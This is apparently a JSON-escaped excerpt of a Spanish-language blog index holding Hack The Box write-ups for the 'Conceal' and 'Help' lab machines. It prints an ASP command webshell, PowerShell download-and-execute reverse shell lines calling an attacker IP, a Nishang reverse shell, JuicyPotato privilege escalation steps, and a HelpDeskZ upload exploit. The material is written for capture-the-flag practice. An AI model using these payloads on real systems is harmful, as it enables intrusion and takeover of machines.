\u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_software\u0026#34;))%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s software:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;LOCAL_ADDR\u0026#34;))%\u0026gt; \u0026lt;% szCMD = request(\u0026#34;cmd\u0026#34;) thisDir = getCommandOutput(\u0026#34;cmd /c\u0026#34; \u0026amp; szCMD) Response.Write(thisDir)%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/BODY\u0026gt; \u0026lt;/HTML\u0026gt;   Obtenemos nuestra webshell y podemos ejecutar comandos en la maquina.\nREVERSE SHELL - Nishang Utilizamos una de las shells que tiene Nishang, y configuramos un archivo asp para subirlo por ftp y al visitar dicho archivo obtener una shell inversa.\nEn nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la sigueinte linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.\n1  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.188 -Port 443   Nuestro archivo rev_shell.asp contiene lo siguiente.\n1 2 3 4  \u0026lt;%@ Language=VBScript %\u0026gt; \u0026lt;% call Server.CreateObject(\u0026#34;WSCRIPT.SHELL\u0026#34;).Run(\u0026#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.188/Invoke-PowerShellTcp.ps1\u0026#39;)\u0026#34;) %\u0026gt;    USER Obtenemos nuestra bandera user.txt.\nSysteminfo Sherlok Utilizando Sherlok para buscar parches que nos pueda servir para escalar privilegios, no encontramos ninguno :/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  PS C:\\Users\\Destitute\\Documents\u0026gt; iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.188/Sherlok.ps1\u0026#39;) PS C:\\Users\\Destitute\\Documents\u0026gt; ls PS C:\\Users\\Destitute\\Documents\u0026gt; Find-Allvulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Not Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135 VulnStatus : Not Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html VulnStatus : Not Vulnerable   WHOAMI /priv Revisamos si SeImpersonatePrivilege esta disponible en la maquina y con el usuario que actualmente tenemos una shell para poder utilizar JuicyPotato para obtener NT AUTHORITY\\SYSTEM.\nPRIVILEGE ESCALATION - JuicyPotato Para escalar privilegios vamos a utilizar un nuevo documento Invoke-PowerShellTcp-potato.ps1 que contiene una shell inversa, tambien un archivo reverse_shell.bat el cual va ser ejecutado por JuicyPotato.exe.\n Juicy Potato  reverse_shell.bat\n1  powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.12.64/Invoke-PowerShellTcp-potato.ps1\u0026#39;)   CLSID Para obtener CLSID para juicypotato vamos a utilizar los siguientes comandos en powershell.\n1 2 3  New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT $CLSID = Get-ItemProperty HKCR:\\clsid\\* | select-object AppID,@{N=\u0026#39;CLSID\u0026#39;; E={$_.pschildname}} | where-object {$_.appid -ne $null} $CLSID   Nos imprimira un alista de AppID y CLSID, copiamos y guardamos los CLSID en un archivo para probar cada uno de ellos con el archivo test_clsid.bat de juicypotato.\nVamos a hacer un pequeño cambio en nuestro archivo test_clsid.bat, solo cambiamos la ruta de nuestros archivos.\n1 2 3 4 5 6 7 8 9 10 11 12  @echo off :: Starting port, you can change it set /a port=10000 SETLOCAL ENABLEDELAYEDEXPANSION FOR /F %%i IN (C:\\Users\\Destitute\\Videos\\tmp.list) DO ( echo %%i !port! C:\\Users\\Destitute\\Videos\\JuicyPotato.exe -z -l !port! -c %%i \u0026gt;\u0026gt; C:\\Users\\Destitute\\Videos\\result.log set RET=!ERRORLEVEL! :: echo !RET! if \u0026#34;!RET!\u0026#34; == \u0026#34;1\u0026#34; set /a port=port+1 )   Descargamos los archivos necesarios en la maquina.\nEjecutamos test_clsid.bat, el cual nos creara un archivo log (result.log) con las pruebas de CLSID que hay en la lista que creamos anteriormente.\nLista CLSID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  7c5-91bf-4547-81ae-fec91a89dec5};CONCEAL\\Destitute {0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\\LOCAL SERVICE {1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\\LOCAL SERVICE {204810b9-73b2-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {2e5e84e9-4049-4244-b728-2d24227157c7};NT AUTHORITY\\LOCAL SERVICE {30766BD2-EA1C-4F28-BF27-0B44E2F68DB7};NT AUTHORITY\\SYSTEM {42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\\SYSTEM {42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\\SYSTEM {4661626C-9F41-40A9-B3F5-5580E80CB347};NT AUTHORITY\\SYSTEM {4B6C85F1-A6D9-433A-9789-89EA153626ED};NT AUTHORITY\\SYSTEM {6d8ff8d2-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8dc-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8dd-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8df-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e1-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e5-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e7-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {7D096C5F-AC08-4F1F-BEB7-5C22C517CE39};NT AUTHORITY\\SYSTEM {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\\SYSTEM {9678f47f-2435-475c-b24a-4606f8161c16};CONCEAL\\Destitute {97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\\SYSTEM {98068995-54d2-4136-9bc9-6dbcb0a4683f};CONCEAL\\Destitute {9acf41ed-d457-4cc1-941b-ab02c26e4686};CONCEAL\\Destitute {9E175B68-F52A-11D8-B9A5-505054503030};NT AUTHORITY\\SYSTEM {9E175B6D-F52A-11D8-B9A5-505054503030};NT AUTHORITY\\SYSTEM {A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\\LOCAL SERVICE {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6};NT AUTHORITY\\SYSTEM {B31118B2-1F49-48E5-B6F5-BC21CAEC56FB};NT AUTHORITY\\SYSTEM {B52D54BB-4818-4EB9-AA80-F9EACD371DF8};NT AUTHORITY\\SYSTEM {C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\\SYSTEM {C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\\SYSTEM {CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\\SYSTEM {E48EDA45-43C6-48e0-9323-A7B2067D9CD5};NT AUTHORITY\\SYSTEM {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\\SYSTEM {E63DE750-3BD7-4BE5-9C84-6B4281988C44};NT AUTHORITY\\SYSTEM {FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\\SYSTEM   Vamos a utilizar un CLSID ({FFE1E5FE-F1F0-48C8-953E-72BA272F2744}) con NT AUTHORITY\\SYSTEM y una shell inversa (reverse_shell.bat).\n1  .\\JuicyPotato.exe -l 1227 -p C:\\Users\\Destitute\\Videos\\reverse_shell.bat -t * -c \u0026#39;{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};\u0026#39;   De igual manera podemos utilizar uno de la lista que JuicyPotato tiene en su lista de Windows 10 Enterprise (https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise).\nROOT  Obtenemos una shell NT AUTHORITY\\SYSTEM o root :)\nY nuestra bandera root.txt.\n","description":"Conceal expone el puerto SNMP donde obtuvimos informacion para generar la configuracion para una VPN y posteriormente conectarnos a esta. Obtuvimos acceso a la maquina con una web shell en FTP que luego actualizamos a una shell de PowerShell. SetImpersonatePrivilege es el privilegio que explotamos con Juicy Potato para escalar privilegios.","id":159,"section":"posts","tags":["snmp","nishang","juicy potato"],"title":"Hack The Box - Conceal","uri":"https://sckull.github.io/posts/conceal/"},{"content":"  Encontramos HelpDeskZ y una vulnerabilidad la cual permite adivinar el nombre de un fichero subido lo que nos dio acceso a la maquina. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.\n   Nombre Help      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.121   Maker cymtrick    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.1, 7.1, 7.7, 2.3, 2.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 8, 8, 2, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  Nmap 7.70 scan initiated Sat Jan 19 23:53:49 2019 as: nmap -sV -A -sC -o nmap.tcp 10.10.10.121 Nmap scan report for 10.10.10.121 Host is up (0.20s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=1/19%OT=22%CT=1%CU=32374%PV=Y%DS=2%DC=T%G=Y%TM=5C440D3 OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 168.27 ms 10.10.12.1 2 233.79 ms 10.10.10.121 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Sat Jan 19 23:55:02 2019 -- 1 IP address (1 host up) scanned in 74.09 seconds   HTTP - Puerto 80 NODEJS - PUERTO 3000 En este puerto, al visitarlo en firefox nos muestra un mensaje del tipo json.\n1  {\u0026#34;message\u0026#34;:\u0026#34;Hi Shiv, To get access please find the credentials with given query\u0026#34;}   GOBUSTER Realizamos una busquedad de directorios y archivos con gobuser.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@sckull:~/htb/help/stuff# gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.121/ -np -t 25 -x php,html,txt ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.121/ [+] Threads : 25 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt [+] Timeout : 10s ===================================================== 18:29:01 Starting gobuster ===================================================== /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 18:32:32 Finished =====================================================   /support/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.121/support/ [+] Threads : 25 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt [+] Timeout : 10s ===================================================== 18:34:31 Starting gobuster ===================================================== /captcha.php (Status: 200) /controllers (Status: 301) /css (Status: 301) /favicon.ico (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /LICENSE.txt (Status: 200) /readme.html (Status: 200) /uploads (Status: 301) /views (Status: 301) ===================================================== 18:37:12 Finished =====================================================   HelpDeskZ En el la direccion /support encontramos una plataforma HelpDeskZ para soporte de sitios web.\nInvestigamos acerca de esta plataforma y encontramos que podemos subir una shell mediante la creacion de un ticket en la plataforma, y tambien encontramos un exploit que se aprovecha de esta vulnerabilidad, dicho exploit se le pasa la url de la plataforma y el nombre de la shell que subimos, con estos parametros el exploit generar un hash md5 con el nombre del archivo y la hora actual.\n HelpDeskZ 1.0.2 - Arbitrary File Upload  La razon por la cual el exploit genera un hash md5 es porque la plataforma al subir un archivo genera un hash md5 con el nombre del archivo y la hora actual, para luego renombrar el archivo con el hash y guardarlo en /uploads/tickets/.\n1  $filename = md5($_FILES[\u0026#39;attachment\u0026#39;][\u0026#39;name\u0026#39;].time()).\u0026#34;.\u0026#34;.$ext;   Tambien que tomar en cuenta que los archivos que se agregan al ticket se guardan en el directorio /uploads/tickets/.\n Codigo Fuente- Tickets Controller  Utilizamos una reverse shell para poder ejecutar comandos dentro de la plataforma para ello vamos renombrar nuestra reverse shell con caracteres null al final del archivo.\nConfiguracion Reverse shell:\nYa que tenemos nuestra reverse shell debemos de tomar en cuenta que al ejecutar el exploit debemos de tener la misma hora del servidor en el que esta la plataforma. Obtuvimos la \u0026ldquo;hora del servidor\u0026rdquo; mediante la respuesta de un request en burpsuite, para luego utilizar esta \u0026ldquo;hora o timezone\u0026rdquo; en nuestra maquina.\nHelpDeskZ - TICKET Para crear un ticket nos dirigimos hacia Submit Ticket, seleccionamos General y Siguiete.\nLuego de esto rellenamos los campos que sean obligatorios (*), agregamos nuestro archivo (shell.php%00.jpg) y escribimos el captcha que nos muestra.\nEXPLOIT Cuando el archivo es subido ejecutamos nuestro exploit. Hay que mencionar que al exploit se le hicieron unos cambios, uno de ellos fue agregar un valor mas alto al rango y verbosidad.\n1  python exploit.py http://10.10.10.121/support/uploads/tickets/ shell.php   Al encontrar nuestra reverse shell el exploit se congela y nos muestra la url.\nNETCAT Por otro lado nuestra terminal en escucha con netcat obtuvo una shell.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION Para escalar privilegios hicimos una pequeña enumeracion, entre ellas el kernel, encontramos que el kernel que esta usando la maquina es vulnerable a un exploit.\n Linux Kernel \u0026lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation   Compilamos y descargamos el exploit dentro de lamaquina, al ejecutarlo nos devuelve una shell con privilegios root.\nY nuestra flag root.txt.\n","description":"Encontramos HelpDeskZ y una vulnerabilidad la cual permite adivinar el nombre de un fichero subido lo que nos dio acceso a la maquina. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.","id":160,"section":"posts","tags":["HelpDeskZ"],"title":"Hack The Box - Help","uri":"https://sckull.github.io/posts/help/"},{"content":"🍕🍕🍕🍕🍕\nTryHackMe : sckull\nTelegram: TryHackMe Español\nHackTheBox: sckull\nGithub: sckull\nTwitter: @sckull_\n","description":"","id":161,"section":"","tags":null,"title":"About","uri":"https://sckull.github.io/about/"}]